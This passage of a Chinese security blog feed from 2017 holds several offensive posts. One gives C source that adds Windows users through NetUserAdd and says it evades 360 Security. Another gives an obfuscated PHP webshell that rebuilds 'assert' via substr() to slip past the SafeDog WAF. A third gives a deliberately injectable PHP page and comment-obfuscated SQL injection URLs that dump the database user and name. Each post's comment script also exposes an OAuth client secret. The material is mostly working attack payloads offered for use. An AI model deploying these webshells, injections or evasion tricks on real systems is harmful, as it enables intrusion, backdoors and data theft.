src="http://ojg8j426f.bkt.clouddn.com/5DCD9BD9-73C7-4BE5-A72D-44A27389865A.png" alt="enter description here"><br>&nbsp;</p><p>直接创建呢？发现失败了，基于行为检测。<br>最后可以发现最新版本的360安全卫士已经pass<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/785D5130-ED0C-4AD2-9E93-5AB4BC153F68.png" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/91A5123B125C6247BCA6AE83B03DD4F3.jpg" alt="enter description here" title="91A5123B125C6247BCA6AE83B03DD4F3.jpg"><br>&nbsp;</p><h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h2><p>现在我们分析，假设服务器上net.exe被删除了怎么办？</p><p>#pragma comment(lib, “netapi32.lib”) 这行代码主要是导入了一个dll，名称为netapi32.dll 如果服务器上没有net.exe，我们将此dll和这个命令行工具上传至服务器，也是可以添加用户的，这就是以前的无net添加用户。</p><h2 id="4-Code"><a href="#4-Code" class="headerlink" title="4.Code"></a>4.Code</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">```javascript</div><div class="line"></div><div class="line"></div><div class="line">//编译平台：VC++6.0 Win10专业版</div><div class="line">#ifndef UNICODE</div><div class="line">#define UNICODE</div><div class="line">#endif</div><div class="line"></div><div class="line">#include&lt;windows.h&gt;</div><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;assert.h&gt;</div><div class="line">#include&lt;lm.h&gt;</div><div class="line">#pragma comment(lib, &quot;netapi32.lib&quot;)</div><div class="line"></div><div class="line">int wmain(int argc, wchar_t *argv[])</div><div class="line">&#123;</div><div class="line">    USER_INFO_1 ui;</div><div class="line">    DWORD dwLevel = 1;</div><div class="line">    DWORD dwError = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line">    if (argc != 3)</div><div class="line">    &#123;</div><div class="line">        printf(&quot;==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;);</div><div class="line">        fwprintf(stderr, L&quot;\tUsage: %s UserName PassWord&quot;, argv[0]);</div><div class="line">        printf(&quot;\n==*==*=*=*=====*======*======*===*==*===*==*==*===*===*=&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line">    ui.usri1_name = argv[1];</div><div class="line">    ui.usri1_password = argv[2];</div><div class="line">    ui.usri1_priv = USER_PRIV_USER;</div><div class="line">    ui.usri1_home_dir = NULL;</div><div class="line">    ui.usri1_comment = NULL;</div><div class="line">    ui.usri1_flags = UF_SCRIPT;</div><div class="line">    ui.usri1_script_path = NULL;</div><div class="line">    nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&amp;ui, &amp;dwError);</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">        fwprintf(stderr, L&quot;\n[*]User add success!! UserName is [%s] \n&quot;, argv[1]);</div><div class="line">    else</div><div class="line">        printf(&quot;Can not add user ... System Error Code is %d \nPlase go to https://msdn.microsoft.com/en-us/library/ms681381(v=vs.85).aspx &quot;, nStatus);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"></div><div class="line">/* UNICODE */</div><div class="line">#ifndef UNICODE</div><div class="line">#define UNICODE</div><div class="line">#endif</div><div class="line">/* 头文件 */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;assert.h&gt;</div><div class="line">#include &lt;windows.h&gt; </div><div class="line">#include &lt;lm.h&gt;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* AddUser</div><div class="line">* 功能    增加用户</div><div class="line">* 参数    szServerName，主机名，如果为本机增加用户，设置为NULL</div><div class="line">*           szUserName，用户名</div><div class="line">*           szPassword，密码</div><div class="line">**************************************/</div><div class="line">int AddUser(LPWSTR szServerName, </div><div class="line">            LPWSTR szUserName,</div><div class="line">            LPWSTR szPassword)</div><div class="line">&#123;</div><div class="line">    USER_INFO_1 ui;</div><div class="line">    DWORD dwLevel = 1;  // 使用 USER_INFO_1 作为参数</div><div class="line">    DWORD dwError = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line">    // 填充 USER_INFO_1</div><div class="line">    ui.usri1_name = szUserName; // 用户名</div><div class="line">    ui.usri1_password = szPassword; // 密码</div><div class="line">    ui.usri1_priv = USER_PRIV_USER; // privilege  </div><div class="line">    ui.usri1_home_dir = NULL;</div><div class="line">    ui.usri1_comment = NULL;</div><div class="line">    ui.usri1_flags = UF_SCRIPT;</div><div class="line">    ui.usri1_script_path = NULL;</div><div class="line">    // 调用 NetUserAdd 增加用户</div><div class="line">    nStatus = NetUserAdd(szServerName,</div><div class="line">        dwLevel,</div><div class="line">        (LPBYTE)&amp;ui,</div><div class="line">        &amp;dwError);</div><div class="line"></div><div class="line">    // 判断结果</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">    &#123;</div><div class="line">        wprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;,</div><div class="line">        szUserName, szServerName);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* AddUserToGroup</div><div class="line">* 功能    为用户组增加用户</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">*           szUserName，用户名</div><div class="line">*           szGroup，用户组名</div><div class="line">**************************************/</div><div class="line">int AddUserToGroup(LPWSTR szServerName, </div><div class="line">                   LPWSTR szUserName,  </div><div class="line">                   LPWSTR szGroup)</div><div class="line">&#123;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line">    // 调用 NetGroupAddUser</div><div class="line">    nStatus =  NetGroupAddUser(</div><div class="line">        szServerName,</div><div class="line">        szGroup,</div><div class="line">        szUserName</div><div class="line">        );</div><div class="line"></div><div class="line">    // 判断结果</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">        fwprintf(stderr, L&quot;User %s has been successfully added on %s\n&quot;,</div><div class="line">        szUserName, szServerName);</div><div class="line"></div><div class="line">    else</div><div class="line">        fprintf(stderr, &quot;NetGroupAddUser A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* DelUser</div><div class="line">* 功能    删除用户</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">*           szUserName，用户名</div><div class="line">**************************************/</div><div class="line">int DelUser(LPWSTR szServerName, LPWSTR szUserName)</div><div class="line">&#123;</div><div class="line">    DWORD dwError = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line"></div><div class="line">    // 调用 NetUserDel 删除用户</div><div class="line">    nStatus = NetUserDel(szServerName, szUserName);</div><div class="line">    // 判断并显示结果</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">        fwprintf(stderr, L&quot;User %s has been successfully deleted on %s\n&quot;,</div><div class="line">        szUserName, szServerName);</div><div class="line">    else</div><div class="line">        fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line"></div><div class="line">    return 0;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* int ListUsers(LPWSTR pszServerName)</div><div class="line">* 功能    列举用户</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">**************************************/</div><div class="line">int ListUsers(LPWSTR pszServerName)</div><div class="line">&#123;</div><div class="line">    LPUSER_INFO_0 pBuf = NULL;</div><div class="line">    LPUSER_INFO_0 pTmpBuf;</div><div class="line">    DWORD dwLevel = 0;</div><div class="line">    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;</div><div class="line">    DWORD dwEntriesRead = 0;</div><div class="line">    DWORD dwTotalEntries = 0;</div><div class="line">    DWORD dwResumeHandle = 0;</div><div class="line">    DWORD i;</div><div class="line">    DWORD dwTotalCount = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line"></div><div class="line">    // 循环，直到可以成功调用 NetUserEnum</div><div class="line">    do </div><div class="line">    &#123;</div><div class="line">        // 调用NetUserEnum函数</div><div class="line">        nStatus = NetUserEnum(pszServerName,</div><div class="line">            dwLevel,// 这里设置为0，使用 LPUSER_INFO_0 返回结果</div><div class="line">            FILTER_NORMAL_ACCOUNT, // 只列举“正常”类型的用户</div><div class="line">            (LPBYTE*)&amp;pBuf,// LPUSER_INFO_0 保存返回结果</div><div class="line">            // MAX_PREFERRED_LENGTH，内存由API分配，需要在之后调用NetApiBufferFree释放</div><div class="line">            dwPrefMaxLen,</div><div class="line">            &amp;dwEntriesRead,// 读了的 Entries</div><div class="line">            &amp;dwTotalEntries,// 一共的 Entries</div><div class="line">            &amp;dwResumeHandle);</div><div class="line">        // 判断是否成功</div><div class="line">        if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))</div><div class="line">        &#123;</div><div class="line">            if ((pTmpBuf = pBuf) != NULL)</div><div class="line">            &#123;</div><div class="line">                // 循环读取用户信息</div><div class="line">                for (i = 0; (i &lt; dwEntriesRead); i++)</div><div class="line">                &#123;</div><div class="line">                    assert(pTmpBuf != NULL);</div><div class="line"></div><div class="line">                    if (pTmpBuf == NULL)</div><div class="line">                    &#123;</div><div class="line">                        fprintf(stderr, &quot;An access violation has occurred\n&quot;);</div><div class="line">                        break;</div><div class="line">                    &#125;</div><div class="line">                    // 输出</div><div class="line">                    wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;usri0_name);</div><div class="line">                    // 下一个</div><div class="line">                    pTmpBuf++;</div><div class="line">                    dwTotalCount++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">            fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">        // 释放内存</div><div class="line">        if (pBuf != NULL)</div><div class="line">        &#123;</div><div class="line">            NetApiBufferFree(pBuf);</div><div class="line">            pBuf = NULL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    while (nStatus == ERROR_MORE_DATA); // end do</div><div class="line"></div><div class="line">    // 释放内存</div><div class="line">    if (pBuf != NULL)</div><div class="line">        NetApiBufferFree(pBuf);</div><div class="line"></div><div class="line">    fprintf(stderr, &quot;Total of %d users\n\n&quot;, dwTotalCount);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* int ListGroup(LPWSTR pszServerName)</div><div class="line">* 功能    列举用户组</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">**************************************/</div><div class="line">int ListGroup(LPWSTR pszServerName)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    DWORD dwLevel = 0;</div><div class="line">    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;</div><div class="line">    DWORD dwEntriesRead = 0;</div><div class="line">    DWORD dwTotalEntries = 0;</div><div class="line">    DWORD dwResumeHandle = 0;</div><div class="line">    DWORD i;</div><div class="line">    DWORD dwTotalCount = 0;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line"></div><div class="line"></div><div class="line">    LPLOCALGROUP_INFO_0 pBuf = NULL;</div><div class="line">    LPLOCALGROUP_INFO_0 pTmpBuf;</div><div class="line"></div><div class="line">    do // begin do</div><div class="line">    &#123;</div><div class="line">        // 调用NetLocalGroupEnum 参数设置与NetLocalGroup类似</div><div class="line">        nStatus = NetLocalGroupEnum(</div><div class="line">            pszServerName,</div><div class="line">            0,</div><div class="line">            (LPBYTE*)&amp;pBuf,</div><div class="line">            dwPrefMaxLen,</div><div class="line">            &amp;dwEntriesRead,</div><div class="line">            &amp;dwTotalEntries,</div><div class="line">            &amp;dwResumeHandle);</div><div class="line">        // 判断结果</div><div class="line">        if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))</div><div class="line">        &#123;</div><div class="line">            if ((pTmpBuf = pBuf) != NULL)</div><div class="line">            &#123;</div><div class="line">                // 循环输出</div><div class="line">                for (i = 0; (i &lt; dwEntriesRead); i++)</div><div class="line">                &#123;</div><div class="line">                    assert(pTmpBuf != NULL);</div><div class="line"></div><div class="line">                    if (pTmpBuf == NULL)</div><div class="line">                    &#123;</div><div class="line">                        fprintf(stderr, &quot;An access violation has occurred\n&quot;);</div><div class="line">                        break;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;lgrpi0_name);</div><div class="line">                    pTmpBuf++;</div><div class="line">                    dwTotalCount++;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        else</div><div class="line">            fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">        // 释放内存</div><div class="line">        if (pBuf != NULL)</div><div class="line">        &#123;</div><div class="line">            NetApiBufferFree(pBuf);</div><div class="line">            pBuf = NULL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    while (nStatus == ERROR_MORE_DATA); // end do</div><div class="line"></div><div class="line">    if (pBuf != NULL)</div><div class="line">        NetApiBufferFree(pBuf);</div><div class="line"></div><div class="line">    fprintf(stderr, &quot;Total of %d groups\n\n&quot;, dwTotalCount);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* ShowUsersInfo</div><div class="line">* 功能    显示指定用户的信息</div><div class="line">* 参数    szServerName，主机名，如果为本机，设置为NULL</div><div class="line">*           pszUserName，用户名</div><div class="line">**************************************/</div><div class="line">int ShowUsersInfo(LPWSTR pszServerName,LPWSTR pszUserName)</div><div class="line">&#123;</div><div class="line"></div><div class="line">    DWORD dwLevel = 4;// 使用 LPUSER_INFO_4 返回结果</div><div class="line">    LPUSER_INFO_4 pBuf = NULL;</div><div class="line">    NET_API_STATUS nStatus;</div><div class="line"></div><div class="line">    nStatus = NetUserGetInfo(pszServerName,</div><div class="line">        pszUserName,</div><div class="line">        dwLevel,    // pBuf参数类型</div><div class="line">        (LPBYTE *)&amp;pBuf);</div><div class="line">    </div><div class="line">    // 判断并输出结果</div><div class="line">    if (nStatus == NERR_Success)</div><div class="line">    &#123;</div><div class="line">        if (pBuf != NULL)</div><div class="line">        &#123;</div><div class="line">            wprintf(L&quot;\n\tAccount:      %s\n&quot;, pBuf-&gt;usri4_name);</div><div class="line">            wprintf(L&quot;\tComment:      %s\n&quot;, pBuf-&gt;usri4_comment);</div><div class="line">            wprintf(L&quot;\tUser comment: %s\n&quot;, pBuf-&gt;usri4_usr_comment);</div><div class="line">            wprintf(L&quot;\tFull name:    %s\n&quot;, pBuf-&gt;usri4_full_name);</div><div class="line">            wprintf(L&quot;\tpriv:    %d\n&quot;, pBuf-&gt;usri4_priv);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    else</div><div class="line">        fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</div><div class="line">    // 释放内存</div><div class="line">    if (pBuf != NULL)</div><div class="line">        NetApiBufferFree(pBuf);</div><div class="line">    return 0;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">/*************************************</div><div class="line">* wmain</div><div class="line">* 功能    入口函数，根据参数判断需要调用的功能函数</div><div class="line">* 参数    参见usage输出</div><div class="line">**************************************/</div><div class="line">int __cdecl wmain(int ac, wchar_t * av[])</div><div class="line">&#123;</div><div class="line"></div><div class="line">    if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-a&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        AddUser(NULL, av[2], av[3]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    else if (ac == 4 &amp;&amp; lstrcmpW( av[1], L&quot;-g&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        AddUserToGroup(NULL, av[2], av[3]);</div><div class="line">    &#125;</div><div class="line">    else    if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        ShowUsersInfo(NULL, av[2]);</div><div class="line">    &#125;</div><div class="line">    else    if (ac == 2 &amp;&amp; lstrcmpW( av[1], L&quot;-i&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        ListUsers(NULL);</div><div class="line">        ListGroup(NULL);</div><div class="line">    &#125;</div><div class="line">    else    if (ac == 3 &amp;&amp; lstrcmpW( av[1], L&quot;-d&quot;) == 0)</div><div class="line">    &#123;</div><div class="line">        DelUser(NULL, av[2]);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        printf(&quot;usage: \n&quot;</div><div class="line">            &quot;\t %ws -a &lt;username&gt; &lt;password&gt; to add a user\n&quot;</div><div class="line">            &quot;\t %ws -g &lt;username&gt; &lt;group&gt; add a user to a group&quot;</div><div class="line">            &quot;\t %ws -i &lt;username&gt; to show user info\n&quot;</div><div class="line">            &quot;\t %ws -d &lt;username&gt; to del a user\n&quot;, </div><div class="line">            av[0], av[0], av[0], av[0]);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="5-欢迎下方一起参与讨论"><a href="#5-欢迎下方一起参与讨论" class="headerlink" title="5.欢迎下方一起参与讨论"></a>5.欢迎下方一起参与讨论</h2><p>&nbsp;</p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/access-dark-web-while-staying-anonymous-with-tor.1280x600-1.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="bypass" scheme="http://yoursite.com/categories/bypass/"/>
    
    
      <category term="bypass, 渗透, web" scheme="http://yoursite.com/tags/bypass-%E6%B8%97%E9%80%8F-web/"/>
    
  </entry>
  
  <entry>
    <title>Bypass_safedog系列1</title>
    <link href="http://yoursite.com/bypass_shell.html"/>
    <id>http://yoursite.com/bypass_shell.html</id>
    <published>2017-09-04T19:32:11.000Z</published>
    <updated>2017-09-12T01:05:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/img/safedog_bypass_1.jpg" alt="image"><br><a id="more"></a></p><blockquote><p>环境:php+mysql+apche<br><br>安全狗:apache版本+8.10规则库<br><br><a href="http://www.inksec.cn/" target="_blank" rel="external">即刻安全</a><br><br>即刻安全纯技术交流群：307283889<br><br>如需转载，请联系本博主声明，私自转载必追究</p></blockquote><h1 id="Prat-1"><a href="#Prat-1" class="headerlink" title="Prat 1"></a>Prat 1</h1><p>在bypass小分队中V@1n3R表哥提到他明天会分享过waf的一句话<br><br>爱搞事的我当然不能只做伸手党,于是决定也分享一些出来,可是发现许久没有做渗透测试了<br><br>手里并没有过waf的一句话了，没办法只好临时刚几个出来</p><h2 id="思路构思以及实现"><a href="#思路构思以及实现" class="headerlink" title="思路构思以及实现"></a>思路构思以及实现</h2><p>本次bypass需要用的一个函数：</p><blockquote><p><a href="http://www.w3school.com.cn/php/func_string_substr.asp" target="_blank" rel="external">substr()</a> //用于返回字符串的一部分。<br><br></p></blockquote><p>其实这个想法很早就有了，不过好像也有大佬有成品，不过我没看见过(可能是很久没接触渗透测试了)<br><br>于是今天晚上就试了一下<br><br>其实不管怎么绕过，一句话最终还是：<br><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">assert($_POST[<span class="string">'x'</span>]);</div></pre></td></tr></table></figure></p><p>所谓的绕过无非就是把这一段进行处理让他达到一个过waf的效果</p><h1 id="Prat-2"><a href="#Prat-2" class="headerlink" title="Prat 2"></a>Prat 2</h1><h2 id="巧用substr函数绕过安全狗"><a href="#巧用substr函数绕过安全狗" class="headerlink" title="巧用substr函数绕过安全狗"></a>巧用substr函数绕过安全狗</h2><p>思路成品：<br><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> $a = substr(<span class="string">"abcdefghijklmnopqrstufwxyz"</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line"> $b = substr(<span class="string">"abcdefghijklmnopqrstufwxyz"</span>,<span class="number">17</span>,<span class="number">3</span>);</div><div class="line"> $c = substr(<span class="string">"abcdefghijklmnopqrstufwxyz"</span>,<span class="number">3</span>,<span class="number">2</span>);</div><div class="line"> $ss = $a.$b.$c;</div><div class="line"> $d  = $ss[<span class="number">0</span>].$ss[<span class="number">2</span>].$ss[<span class="number">2</span>]; <span class="comment">//ass</span></div><div class="line"> $dd = $ss[<span class="number">5</span>].$ss[<span class="number">1</span>].$ss[<span class="number">3</span>]; <span class="comment">//ert</span></div><div class="line"> $x = $d.$dd;</div><div class="line">$x($_POST[<span class="string">'x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>这里主要关注这两行<br><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">$d  = $ss[<span class="number">0</span>].$ss[<span class="number">2</span>].$ss[<span class="number">2</span>]; <span class="comment">//ass</span></div><div class="line">$dd = $ss[<span class="number">5</span>].$ss[<span class="number">1</span>].$ss[<span class="number">3</span>]; <span class="comment">//ert</span></div><div class="line">$x = $d.$dd;</div></pre></td></tr></table></figure></p><p>上面说了，一句话最终结果还是assert($_POST[‘x’]); 所以这里的$x肯定是assert<br>输出一下就知道。<br>如图：<br><img src="/img/2/shell_1.jpg" alt="image"><br>可以看见echo 出来了<strong>assert</strong><br>那么他是如何得到assert的呢，我们来看一下<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$x = $d.$dd;</div></pre></td></tr></table></figure></p><p>可以发现，<strong>$x</strong>通过<strong>$d</strong>跟<strong>$dd</strong>拼接得到的<br><br><strong>$d</strong>跟<strong>$dd</strong>是通过截取$ss的字符串得到的<br><br>我们分别来输出一下每一个变量获取到的字符串<br><img src="/img/2/shell_2.jpg" alt="image"><br>可以发现<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$a = a     //从字符串的第0个字符开始截取，向右截取1个字符</div><div class="line">$b = rst   //从字符串的第17个字符开始截取，向右截取3个字符</div><div class="line">$c = de   //从字符串的第17个字符开始截取，向右截取3个字符</div><div class="line">$ss = arstde //为三个变量的拼接的来</div></pre></td></tr></table></figure></p><p>那么整个过程就很好理解<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$d = ass   //分别截取$ss的第0,2,2字符</div><div class="line">$dd = ert  //分别截取$ss的第5,1,3字符</div><div class="line">最后拼接成assert</div></pre></td></tr></table></figure></p><p>看一下是否能过狗<br><img src="/img/2/shell_3.jpg" alt="image"><br>完美过狗，并没有拦截</p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/img/safedog_bypass_1.jpg&quot; alt=&quot;image&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="bypass" scheme="http://yoursite.com/categories/bypass/"/>
    
    
      <category term="bypass" scheme="http://yoursite.com/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>Bypass_safedog系列2</title>
    <link href="http://yoursite.com/bypass_safedog.html"/>
    <id>http://yoursite.com/bypass_safedog.html</id>
    <published>2017-09-03T19:32:11.000Z</published>
    <updated>2017-09-12T01:05:47.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/img/safedog_bypass_1.jpg" alt="image"><br><a id="more"></a></p><blockquote><p>环境:php+mysql+apche<br><br>安全狗:apache版本+8.10规则库<br><br><a href="http://www.inksec.cn/" target="_blank" rel="external">即刻安全</a><br><br>即刻安全纯技术交流群：307283889<br><br>如需转载，请练习本博主声明，私自转载必追究</p></blockquote><h1 id="prat-1"><a href="#prat-1" class="headerlink" title="prat 1"></a>prat 1</h1><h2 id="本文大致内容"><a href="#本文大致内容" class="headerlink" title="本文大致内容"></a>本文大致内容</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">+ 思路以及想法</div><div class="line">- 四重注释绕过safedog</div><div class="line">+ 实战绕过</div><div class="line">- 绕过and 1=1</div><div class="line">- 绕过union+select</div><div class="line">- 爆表</div><div class="line">- 爆字段</div><div class="line">- 读内容</div></pre></td></tr></table></figure><h1 id="prat-2"><a href="#prat-2" class="headerlink" title="prat 2"></a>prat 2</h1><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$link = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'security'</span>);</div><div class="line">$sql = <span class="string">"select * from users where id="</span>.$_GET[<span class="string">'id'</span>];</div><div class="line"></div><div class="line">$result = mysqli_query($link,$sql);</div><div class="line"><span class="keyword">if</span>($rows = mysqli_fetch_array($result))&#123;</div><div class="line"><span class="keyword">echo</span> $rows[<span class="string">'id'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> $rows[<span class="string">'username'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> $rows[<span class="string">'password'</span>];</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">&#125;</div><div class="line">mysqli_close($link);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h1 id="prat-3"><a href="#prat-3" class="headerlink" title="prat 3"></a>prat 3</h1><h2 id="绕过-and-1-1"><a href="#绕过-and-1-1" class="headerlink" title="绕过 and 1=1"></a>绕过 and 1=1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=1 and 1=1</div></pre></td></tr></table></figure><p><img src="/img/safedog_bypass_1.jpg" alt="image"><br>发现惨遭拦截，首先让我们来看一下他拦截什么，不拦截什么。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">and        不拦截</div><div class="line">and 1      拦截</div><div class="line">and 1 =    拦截</div><div class="line">and 1 = 1  拦截</div></pre></td></tr></table></figure></p><p>由此可见，只要and后面出现数字或者成立一个等式那么他就拦截，那我们用/**/注释来绕过一下看看<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/**/aNd/**//**/&apos;a&apos;/**/ = /**/&apos;a&apos;/**/</div></pre></td></tr></table></figure></p><p>注释包含把1=1替换成<strong>‘a’ = ‘a’</strong>就得到了url:<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://192.168.1.107/sql.php?id=1/**/aNd/**//**/&apos;a&apos;/**/=/**/&apos;b&apos;/**/</div></pre></td></tr></table></figure></p><p><img src="/img/safedog_bypass_2.jpg" alt="image"><br>返回不正常(等式不等)并且发现狗就不拦截了，可见注释方法还是如此任性</p><h2 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h2><p>我发现我装的狗是不会拦截order by的，所以也就没绕，有需求在说。<br><img src="/img/safedog_bypass_3.jpg" alt="image"><br>字段为3，接下来爆库，当前用户。</p><h2 id="绕过union-select"><a href="#绕过union-select" class="headerlink" title="绕过union+select"></a>绕过union+select</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=1 UNION SELECT 1,2,3</div></pre></td></tr></table></figure><p><img src="/img/safedog_bypass_4.jpg" alt="image"><br>同样，先看一下他拦截什么。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">union 不拦截</div><div class="line">select 不拦截</div><div class="line">union select 拦截</div></pre></td></tr></table></figure></p><p>很明显，我们只需要在union与select之间处理一下就可以了。<br>首先使用/<em>!50000/注释包含/</em>!<em>/然后使用/**/与/</em>–*/打乱一下结构，在稍微进行一下编码处理就可以了<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,2,3)/*--*/*/-- -</div></pre></td></tr></table></figure></p><p><img src="/img/safedog_bypass_5.jpg" alt="image"><br>可以发现，已经正常显示数字，并且狗没有拦截。   什么？你说没看懂？那么看下图<br><img src="/img/safedog_bypass_6.jpg" alt="image"><br>拆分一下就发现其实很好理解，使用()把select的内容包起来。</p><h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user(),database())/*--*/*/-- -</div></pre></td></tr></table></figure><p><img src="/img/safedog_bypass_7.jpg" alt="image"><br>发现又特么拦截了，很明显，他会拦截一些常用系统函数(还有许多就不列出来了，列出常用的)<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1. version()——MySQL 